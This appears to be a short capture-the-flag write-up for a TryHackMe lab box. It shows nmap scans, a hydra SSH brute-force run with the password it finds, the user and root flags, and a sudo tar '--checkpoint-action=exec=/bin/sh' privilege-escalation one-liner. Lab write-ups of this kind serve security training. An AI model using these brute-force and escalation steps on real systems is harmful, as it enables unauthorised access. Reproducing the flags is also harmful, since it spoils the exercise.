
```nmap -Pn -p- --min-rate=10000 10.10.78.125```
-Pn to disable ping probes
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

nmap detailed scan:

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.56.56
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dcf8dfa7a6006d18b0702ba5aaa6143e (RSA)
|   256 ecc0f2d91e6f487d389ae3bb08c40cc9 (ECDSA)
|_  256 a41a15a5d4b1cf8f16503a7dd0d813c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


└──╼ $hydra -L user.txt  -P locks.txt 10.10.35.129 -t 4 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-16 22:20:34
[DATA] max 4 tasks per 1 server, overall 4 tasks, 156 login tries (l:6/p:26), ~39 tries per task
[DATA] attacking ssh://10.10.35.129:22/
[STATUS] 43.00 tries/min, 43 tries in 00:01h, 113 to do in 00:03h, 4 active
[STATUS] 38.00 tries/min, 76 tries in 00:02h, 80 to do in 00:03h, 4 active
[STATUS] 34.00 tries/min, 102 tries in 00:03h, 54 to do in 00:02h, 4 active
[STATUS] 32.00 tries/min, 128 tries in 00:04h, 28 to do in 00:01h, 4 active
[22][ssh] host: 10.10.35.129   login: lin   password: RedDr4gonSynd1cat3




gives off user.txt ----> THM{CR1M3_SyNd1C4T3}


sudo -l 


lin can run tar as root in the system 

quick digging on gtfobins gives the result
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

which give root access
and cat root.txt gives 
THM{80UN7Y_h4cK3r}